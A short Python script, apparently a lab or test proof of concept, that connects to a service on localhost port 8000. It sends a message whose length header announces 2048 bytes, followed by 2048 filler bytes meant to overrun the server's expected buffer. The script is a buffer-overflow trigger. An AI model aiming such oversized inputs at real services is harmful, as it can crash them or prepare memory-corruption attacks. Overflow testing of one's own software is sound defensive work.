#!/usr/bin/python

import os
import socket


HOST = '127.0.0.1'
PORT = 8000


def get_payload():
        # construct message of size > expected buf size
        # with 4 bytes idicating the size is 2048 in big endian order
    payload = chr(0x0) * 2 + chr(0x8) + chr(0x0) * 5 + 'a' * 2048
    return payload


def main():
    payload = get_payload()
    conn = socket.socket()
    conn.connect((HOST, PORT))
    try:
        conn.sendall(payload)
    finally:
        conn.close()


if __name__ == '__main__':
    main()
